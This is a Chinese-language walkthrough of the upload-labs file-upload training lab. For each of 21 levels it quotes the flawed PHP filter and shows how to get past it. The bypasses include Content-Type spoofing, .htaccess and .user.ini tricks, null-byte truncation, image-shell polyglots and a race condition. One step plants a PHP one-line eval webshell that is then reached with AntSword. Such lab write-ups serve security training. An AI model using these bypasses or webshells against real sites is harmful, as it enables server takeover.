# 文件上传靶场安装

https://github.com/c0ny1/upload-labs



# 打开靶场

http://192.168.31.193:7298/

# pass1

```php
function checkFile() {
    var file = document.getElementsByName('upload_file')[0].value;
```

使用javascript验证文件后缀，禁用掉浏览器js,完成上传。

## **JS前端验证**

漏洞描述：利用前端 JS 对上传文件后缀进行校验，后端没进行检测 

利用方法：

1. 浏览器**禁用 js**

2. 使用浏览器的开发者工具**删掉提交时调用js的函数**。

3. burp抓包 先上传白名单文件，再用 burp在**Content-Type** **修改上传*文件后缀***

   

# pass2

```php
if (($_FILES['upload_file']['type'] == 'image/jpeg') || ($_FILES['upload_file']['type'] == 'image/png') || ($_FILES['upload_file']['type'] == 'image/gif')) {
```

判断文件类型，设置**白名单**，只允许**image/jpeg**，**image/png**，**image/gif**类型的图片上传。

burpsuite抓包，修改要上传文件的**Content-Type**类型为这里指定的文件类型。

![image-20221122163416253](https://image.201068.xyz/assets/image-20221122163416253.png)

将content-type修改为image/png，

![image-20221122163451618](https://image.201068.xyz/assets/image-20221122163451618.png)

文件上传成功。

# pass3

```php
if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array('.asp','.aspx','.php','.jsp');
        $file_name = trim($_FILES['upload_file']['name']);
        $file_name = deldot($file_name);//删除文件名末尾的点
        $file_ext = strrchr($file_name, '.');
        $file_ext = strtolower($file_ext); //转换为小写
        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
        $file_ext = trim($file_ext); //首尾去空
```

对扩展后缀使用**黑名单**，但是不全，尝试使用**等价扩展名**

例如，传的文件是php，那么它的等价扩展名为php3，php4等等

![image-20221122164841666](https://image.201068.xyz/assets/image-20221122164841666.png)

同样将content-type修改为image/png，

![image-20221122164910783](https://image.201068.xyz/assets/image-20221122164910783.png)

上传成功。将图片在新标签也打开，发现**图片被重命名**了。

![image-20221122205041349](https://image.201068.xyz/assets/image-20221122205041349.png)

将图片右键在新标签页打开

![image-20221122205456474](https://image.201068.xyz/assets/image-20221122205456474.png)

http://192.168.31.193:7298/upload/202211222050584341.php3

使用蚁剑连接

![image-20221122211217281](https://image.201068.xyz/assets/image-20221122211217281.png)

连接成功

# pass4

```
 if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array(".php",".php5",".php4",".php3",".php2",".php1",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".pHp1",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".ini");
```

黑名单十分丰富，使用**.htaccess**改变文件扩展名。

**上传.htaccess 解析文件**，利用其配置，将白名单文件的类型解析成 php 文件类型。

将服务器上的 1.jpg 文件解析成 php 文件.

```php+HTML
<FilesMatch "1.jpg">
SetHandler application/x-httpd-php
</FilesMatch>
```

**再上传一个一句话木马**，文件名为 1.jpg，依旧访问 1.jpg，但其会以 php 形式显示

![image-20221122211439276](https://image.201068.xyz/assets/image-20221122211439276.png)

连接成功

# pass5

```php+HTML
$deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess");
$file_ext = strtolower($file_ext); //转换为小写
```

将.htaccess也禁用掉了

利用**.user.ini** 配置文件，

.user.ini 相当于一个用 户自定义的 php.ini



上传文件 **.user.ini**

内容为： 

`auto_prepend_file=2.jpg` 

再上传一个内容为 php 一句话脚本，命名为 2.jpg。

.user.ini 文件作用：

所有的 php 文件都自动包含 2.jpg 文件。



# pass6

```php+HTML
 $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess",".ini");
```

黑名单新增.ini配置文件，

但是这关没有使用**strtolower()**函数对**大小写**进行限制。

将文件名改成大写：**1.PHP**

上传文件后，文件被重命名为**202211221856456857.PHP**

http://192.168.31.193:7298/upload/202211222050584341.php3

使用蚁剑连接，连接成功

# pass7

访问http://192.168.31.193:8089/Pass-07/index.php

```
        $file_name = deldot($file_name);//删除文件名末尾的点
        $file_ext = strrchr($file_name, '.');
        $file_ext = strtolower($file_ext); //转换为小写
        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
```

本关没有**trim()**函数，首尾去**空格**

因为windows不能在扩展名添空格，会被删除；只能bripsuite抓包在后缀名后添加空格：**1.php** （使用php5.3.29版本复现的）

![image-20221122215554928](https://image.201068.xyz/assets/image-20221122215554928.png)

上传成功,连接**202211230600234539.php **

![image-20221122220048550](https://image.201068.xyz/assets/image-20221122220048550.png)

![image-20221122220205776](https://image.201068.xyz/assets/image-20221122220205776.png)

文件上传成功，后缀名后的空格消失，成功上传了php文件。

# pass8

访问http://192.168.31.193:8089/Pass-08/index.php

```php+HTML
$file_ext = strrchr($file_name, '.');
$file_ext = strtolower($file_ext); //转换为小写
$file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
$file_ext = trim($file_ext); //首尾去空
```

本关**deldot()函数**没有**删除文件名末尾去点**

抓包在php后缀名后加一个点绕过：**1.php.**

![image-20221123101058484](https://image.201068.xyz/assets/image-20221123101058484.png)

![image-20221123101957020](https://image.201068.xyz/assets/image-20221123101957020.png)

上传成功，网页空白，被当作代码执行了。

![image-20221123102159777](https://image.201068.xyz/assets/image-20221123102159777.png)

上传成功的文件，后面的点也被自动删除。

# pass9

```php+HTML
$file_name = deldot($file_name);//删除文件名末尾的点
$file_ext = strrchr($file_name, '.');
$file_ext = strtolower($file_ext); //转换为小写
$file_ext = trim($file_ext); //首尾去空
```

这一关没有**str_ireplace()**函数**去除字符串::$DATA**

没有这个限制，就添加这个`::$DATA`字符串上去

`1.php::$DATA`

![image-20221123103656056](https://image.201068.xyz/assets/image-20221123103656056.png)

![image-20221123104003841](https://image.201068.xyz/assets/image-20221123104003841.png)

上传成功后，发现无法访问，可能后缀后的字符串在上传成功后被删除了；

删除后面的`::$DATA`，再次访问，

![image-20221123104204581](https://image.201068.xyz/assets/image-20221123104204581.png)

成功访问，也被当做代码被执行。

# pass10

```
$file_name = deldot($file_name);//删除文件名末尾的点
$file_ext = strrchr($file_name, '.');
$file_ext = strtolower($file_ext); //转换为小写
$file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
$file_ext = trim($file_ext); //首尾去空
```

这关没有缺什么函数，尝试其他思路

代码顺序是先删除一个点和在删除一个空格，那尝试多添加一个点：**点，空格，点**这样后缀名后会剩一个点，然后就绕过黑名单。

`1.php. .`

![image-20221123105324928](https://image.201068.xyz/assets/image-20221123105324928.png)

# pass11

```
$file_name = str_ireplace($deny_ext,"", $file_name);
```

本关没有之前的处理函数，但是增加了**str_ireplace()**函数：若匹配上了黑名单的后缀名，则直接**删除后缀名**，替换为空。

尝试**双写**后缀名`1.pphphp`

![image-20221123110603709](https://image.201068.xyz/assets/image-20221123110603709.png)

![image-20221123110637203](https://image.201068.xyz/assets/image-20221123110637203.png)

上传成功

# pass12

```
 $img_path = $_GET['save_path']."/".rand(10, 99).date("YmdHis").".".$file_ext;
```

使用**save_path**路径保存

抓包查看是什么样子的

![image-20221123140759549](https://image.201068.xyz/assets/image-20221123140759549.png)

保存在upload目录下，使用**文件名截断**%00，控制读取的路径。

**get型00截断**：`1.php%00`

![image-20221123141407395](https://image.201068.xyz/assets/image-20221123141407395.png)

图片改为1.jpg

![image-20221123141432715](https://image.201068.xyz/assets/image-20221123141432715.png)

# pass13

```
  $img_path = $_POST['save_path']."/".rand(10, 99).date("YmdHis").".".$file_ext;
```

**post型00截断**，需要在 **16 进制中修改**，因为 POST 不会像 GET 那 样对%00 进行自动解码。

![image-20221123144043894](https://image.201068.xyz/assets/image-20221123144043894.png)

![image-20221123144302559](https://image.201068.xyz/assets/image-20221123144302559.png)

# pass14

![image-20221123152221141](https://image.201068.xyz/assets/image-20221123152221141.png)

```javascript
function getReailFileType($filename){
    $file = fopen($filename, "rb");
    $bin = fread($file, 2); //只读2字节
```

**getReailFileType()**函数**读取文件头**前两个字节。判断文件类型，利用**图片马**绕过检查

## 图片马制作 

在 cmd 里执行 `copy 1.gif/b+1.PHP/a 2.gif` 

- 1.jpg 为任意图片 
- 1.php 为我们要插入的木马代码 
- 2.jpg 为我们要创建的图片马 
- ![image-20221123150533056](https://image.201068.xyz/assets/image-20221123150533056.png)

使用文件包含漏洞，

![image-20221123152238096](https://image.201068.xyz/assets/image-20221123152238096.png)

http://192.168.31.193:8089/include.php?file=upload/5920221123150637.gif

# pass15

```
$info = getimagesize($filename);
$ext = image_type_to_extension($info[2]);
```

**getimagesize()**函数**获取图片大小**，由此来判断是不是一个有效的图片。

依旧上传上一个的图片码，利用提供的文件包含漏洞接口，连接蚁剑。

# pass16

```
//需要开启php_exif模块
$image_type = exif_imagetype($filename);
```

**exif_imagetype()**函数自动读取**图片的第一个字节并检查其签名**，来判断文件类型。

同样上传图片码

# pass17

```
 // 获得上传文件的基本信息，文件名，类型，大小，临时文件路径
    $filename = $_FILES['upload_file']['name'];
    $filetype = $_FILES['upload_file']['type'];
    $tmpname = $_FILES['upload_file']['tmp_name'];

    $target_path=UPLOAD_PATH.'/'.basename($filename);

    // 获得上传文件的扩展名
    $fileext= substr(strrchr($filename,"."),1);
```

这关会获取文件扩展名。综合判断了后缀名、content-type，

以及利用 **imagecreatefromgif** 判断是否为 gif 图片，并在最后对文件内容进行了**二次渲染**，修改文件内容 

上传一个 GIF 图片马，然后将其下载下来，

查看其十六进制的文件内容， 找到二次渲染后不变的地方，

而这个地方就是可以插入一句话的地方

# pass18

```
if(isset($_POST['submit'])){
    $ext_arr = array('jpg','png','gif');
    $file_name = $_FILES['upload_file']['name'];
    $temp_file = $_FILES['upload_file']['tmp_name'];
    $file_ext = substr($file_name,strrpos($file_name,".")+1);
    $upload_file = UPLOAD_PATH . '/' . $file_name;

    if(move_uploaded_file($temp_file, $upload_file)){
        if(in_array($file_ext,$ext_arr)){
             $img_path = UPLOAD_PATH . '/'. rand(10, 99).date("YmdHis").".".$file_ext;
             rename($upload_file, $img_path);
             $is_upload = true;
        }else{
            $msg = "只允许上传.jpg|.png|.gif类型文件！";
            unlink($upload_file);
        }
```

会将图片路径移动，并且删除上传的文件。

但是判断到删除有时间差，在php文件还没有被删除，然后**再产生新的php文件**。

条件竞争:利用代码执行的时间差，产生新的文件。



上传competition.php文件，

```php
<?php fputs(fopen( wuya.php' , 'w ),'<?php @eval($_POST[ "wuya"])?>');?>
```

burpsuite抓包使用intruder模块**不断发包上传**php文件。

![image-20221123163555707](https://image.201068.xyz/assets/image-20221123163555707.png)

同样使用burpsuite抓包**不断访问**http://192.168.31.193:7298/upload/competition.php，触发php文件，**产生新的php文件**。

![image-20221123165255899](https://image.201068.xyz/assets/image-20221123165255899.png)

连接成功

# pass19

```
require_once("./myupload.php");
$imgFileName =time();

var $cls_arr_ext_accepted = array(".doc", ".xls", ".txt", ".pdf", ".gif", ".jpg", ".zip", ".rar", ".7z",".ppt",".html", ".xml", ".tiff", ".jpeg", ".png" );

switch ($status_code) {
        case 1:
            $is_upload = true;
            $img_path = $u->cls_upload_dir . $u->cls_file_rename_to;
            break;
        case 2:
            $msg = '文件已经被上传，但没有重命名。';
            break; 
        case -1:
```

使用白名单，如果文件上传的过快，**还没来得及重命名**，文件名将被保留

`1.php.7z`

Apache2.4 的**解析漏洞**会将`.php.*`当中php代码执行

# pass20

```
$deny_ext = array("php","php5","php4","php3","php2","html","htm","phtml","pht","jsp","jspa","jspx","jsw","jsv","jspf","jtml","asp","aspx","asa","asax","ascx","ashx","asmx","cer","swf","htaccess");

        $file_name = $_POST['save_name'];
        $file_ext = pathinfo($file_name,PATHINFO_EXTENSION);

        if(!in_array($file_ext,$deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH . '/' .$file_name;
```

使用黑名单，逻辑漏洞，使用 **pathinfo()函数**从**最后一个小数点进行截取**方式检查文件名后缀

在文件名后缀加一个小数点绕过 `1.php.`，

上传成功可以直接访问 1.php

# pass21

```
if(!in_array($_FILES['upload_file']['type'],$allow_type)){
        $msg = "禁止上传该类型文件!";
    }else{
        //检查文件名
        $file = empty($_POST['save_name']) ? $_FILES['upload_file']['name'] : $_POST['save_name'];
        if (!is_array($file)) {
            $file = explode('.', strtolower($file));
        }
```

对参数$file 进行判断，如果不是，将其修改为**数组**

**提前传入数组**时，造成漏洞



